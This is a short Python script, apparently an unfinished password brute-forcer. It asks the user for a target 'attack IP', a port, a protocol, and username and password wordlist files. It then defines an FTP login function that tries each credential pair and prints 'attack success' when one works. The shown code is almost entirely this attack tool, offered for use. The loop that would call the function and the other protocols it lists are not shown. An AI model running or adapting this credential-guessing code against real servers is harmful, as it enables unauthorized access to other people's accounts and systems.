# -*- coding: utf-8 -*-
"""
Created on Sun Jun 22 15:36:40 2025

@author: mayuk
"""

import time
from ftplib import FTP

start_time = time.time()

target_ip = input("Enter attack IP: ")
target_port = int(input("Enter port no.: "))
protocol = input("Enter protocol type (ssh/ftp/http/smtp): ").lower()
username_file = input("Enter your username file: ")
password_file = input("Enter your password file: ")
timeout_seconds = int(input("Enter your time (seconds): "))

# FTP Login 
def try_ftp_login(host, port, username, password):
    try:
        ftp = FTP()
        ftp.connect(host, port, timeout=timeout_seconds)
        ftp.login(user=username, passwd=password)
        print(f"[FTP attack success = balle balle🪇] {username}:{password}")
        ftp.quit()
        return True
    except Exception as e:
        print(f"[FTP FAIL☠] {username}:{password} - {e}")
    return False